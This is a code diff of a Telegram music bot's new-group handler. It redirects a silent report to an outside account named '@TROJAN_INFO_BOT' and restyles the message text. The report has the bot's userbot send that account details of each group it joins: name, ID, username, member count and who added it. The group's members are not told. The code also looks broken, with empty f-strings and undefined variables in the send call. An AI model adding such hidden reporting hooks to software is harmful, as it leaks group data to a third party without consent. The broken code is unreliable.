@@ -61,7 +61,7 @@ async def join_watcher(_, message):
 @app.on_message(filters.new_chat_members, group=-9)
 async def join_watcher(_, message):
     try:
-        LOG = "@SARKAR_BABY_BOT"
+        LOG = "@TROJAN_INFO_BOT"
         userbot = await get_assistant(message.chat.id)
         chat = message.chat
         for members in message.new_chat_members:
@@ -71,12 +71,12 @@ async def join_watcher(_, message):
                     message.chat.username if message.chat.username else "𝐏ʀɪᴠᴀᴛᴇ 𝐆ʀᴏᴜᴘ"
                 )
                 msg = (
-                    f"📝𝐌ᴜsɪᴄ 𝐁ᴏᴛ 𝐀ᴅᴅᴇᴅ 𝐈ɴ 𝐀 #𝐍ᴇᴡ_𝐆ʀᴏᴜᴘ\n\n"
-                    f"📌𝐂ʜᴀᴛ 𝐍ᴀᴍᴇ:\n"
-                    f"🍂𝐂ʜᴀᴛ 𝐈ᴅ: \n"
-                    f"🔐𝐂ʜᴀᴛ 𝐔sᴇʀɴᴀᴍᴇ: @\n"
-                    f"📈𝐆ʀᴏᴜᴘ 𝐌ᴇᴍʙᴇʀs: \n"
-                    f"🤔𝐀ᴅᴅᴇᴅ 𝐁ʏ: "
+                    f"☞ ᴍᴜsɪᴄ ʙᴏᴛ ᴀᴅᴅᴇᴅ ɪɴ ᴀ #New_Group\n\n"
+                    f"☞ ᴄʜᴀᴛ ɴᴀᴍᴇ:\n"
+                    f"☞ ᴄʜᴀᴛ ɪᴅ: \n"
+                    f"☞ ᴄʜᴀᴛ ᴜsᴇʀɴᴀᴍᴇ: @\n"
+                    f"☞ ɢʀᴏᴜᴘ ᴍᴇᴍʙᴇʀs: \n"
+                    f"☞ ᴀᴅᴅᴇᴅ ʙʏ: "
                 )
                 oks = await userbot.send_message(LOG, f"/start")
                 Ok = await userbot.send_message(LOG, f"@{app.username}\n\n{log}\n\n{error}\n\n{errors}")
